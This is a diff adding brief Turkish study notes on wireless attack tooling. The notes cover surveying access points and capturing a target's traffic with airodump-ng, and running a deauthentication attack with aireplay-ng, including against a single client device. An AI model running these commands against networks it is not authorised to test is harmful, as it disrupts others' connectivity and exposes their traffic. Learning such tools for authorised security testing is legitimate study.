@@ -1,0 +1,18 @@
+- iwconfig (sadece detaylı wireless bilgileri)
+- mode -managed -monitor olabilir
+---
+- airmon-ng start/stop/check wlan0/wlan0mon **(Wifi Adaptör Mod Değiştirme)**
+---
+- airodump-ng wlan0mon **(Modemler Hakkında Bilgi Toplama)
+	- BSSID: Modem MAC Adresi
+	- PWR: Yakınlık-Uzaklık
+	- CH: Kullanım Kanalı
+	- ENC: Şifreleme
+---
+- airodump-ng --channel ...*channel*...  --bssid ...*bssid*... wlan0mon **(Hedef Modem Bilgilerini Toplama)**
+	- wlan0mon'dan önce --write ...*dosya*... eklersen detaylı kayıt tutar. cap dosyası wireshark ile detaylıca inceleniyor
+	- Station: Modeme bağlı cihazların MAC adresleri
+	- Frames: İnternet kullanımı(paket)
+---
+- aireplay-ng --deauth ...*paketsayısı*... --a ...*bssid*...  wlan0mon **(Deauth Saldırısı)**
+	- --c ...*station*... eklersen belirli bir cihaza saldırırsın
